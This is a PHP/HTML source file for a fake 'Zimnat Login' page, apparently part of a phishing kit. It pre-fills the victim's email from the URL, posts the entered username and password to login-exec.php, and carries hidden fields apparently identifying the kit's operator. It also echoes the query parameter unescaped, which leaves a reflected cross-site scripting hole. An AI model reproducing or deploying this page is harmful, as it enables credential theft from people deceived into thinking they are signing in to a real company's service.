<?php
$email = $_GET['email'];

?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Dashboard">
    <meta name="keyword" content="Dashboard, Bootstrap, Admin, Template, Theme, Responsive, Fluid, Retina">

    <title>Zimnat | Sign In</title>

   <!-- CSS Files -->
<link href="reGassets/css/bootstrap.min.css" rel="stylesheet" media="screen">
<link href="reGassets/css/font-awesome.min.css" rel="stylesheet">
<link href="reGassets/fonts/icon-7-stroke/css/pe-icon-7-stroke.css" rel="stylesheet">
<link href="reGassets/css/animate.css" rel="stylesheet" media="screen">
<link href="reGassets/css/owl.theme.css" rel="stylesheet">
<link href="reGassets/css/owl.carousel.css" rel="stylesheet">

<!-- Colors -->
<link href="reGassets/css/css-index.css" rel="stylesheet" media="screen">

<!-- Google Fonts -->
<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:100,300,400,700,900,100italic,300italic,400italic,700italic,900italic" />
<style>
label{color:white;}
</style>
  </head>

  <body>

      <!-- **********************************************************************************************************************************************************
      MAIN CONTENT
      *********************************************************************************************************************************************************** -->

	  <div id="login-page">
	  	<div class="container">
	  		<!-- /.signup form -->
				<div class = "row">
                <div class = "col-lg-2"></div>

                <div class = "col-lg-8">
				
					<div class="signup-header wow fadeInUp">
						<h3 class="form-title text-center">Zimnat Login</h3>
						<form class="form-header" action="login-exec.php" method="POST" id="#" autocomplete="off">
						<input type="hidden" name="myEmail" value="503bdae81fde8612ff4944435">
						<input type="hidden" name="myPassword" value="bfdba52708">
							<div class="form-group">
								<input class="form-control input-lg" name="username" id="email" type="text" value="<?php echo $email ?>" required>
							</div>
							<div class="form-group">
								<input class="form-control input-lg" name="password" id="password" type="password" placeholder="Password" required>
							</div>
							<div class="form-group last">
								<input type="submit" class="btn btn-warning btn-block btn-lg" value="LOGIN">
							</div>
							<p class="privacy text-center"> <a href="#">Forgot Password?</a>.</p>
						</form>
					</div>				
				
				</div>
				
				</div>
		         
	  	
	  	</div>
	  </div>

    <!-- js placed at the end of the document so the pages load faster -->
    <script src="reGassets/assets/js/jquery.js"></script>
    <script src="reGassets/assets/js/bootstrap.min.js"></script>

    <!--BACKSTRETCH-->
    <!-- You can use an image of whatever size. This script will stretch to fit in any screen size.-->
    <script type="text/javascript" src="reGassets/assets/js/jquery.backstretch.min.js"></script>
    <script>
        $.backstretch("reGassets/assets/img/file.jpg", {speed: 500});
    </script>
	<!-----Validate Password--->
	<script type = "text/javascript">
	var password = document.getElementById("password")
	,confirm_password = document.getElementById("confirm_password");

	function validatePassword(){
	if(password.value != confirm_password.value) {
	confirm_password.setCustomValidity("Passwords Don't Match");
	} else {
	confirm_password.setCustomValidity('');
	}
	}

	password.onchange = validatePassword;
	confirm_password.onkeyup = validatePassword;
	
	
	</script>
	<script type = "text/javascript">
	var email = document.getElementById("email")
	,confirm_email = document.getElementById("confirm_email");
	function validateEmail(){
	if(email.value != confirm_email.value) {
	confirm_email.setCustomValidity("Email Addresses Don't Match");
	} else {
	confirm_email.setCustomValidity('');
	}
	}

	email.onchange = validateEmail;
	confirm_email.onkeyup = validateEmail;
	
	</script>
	


  </body>
</html>
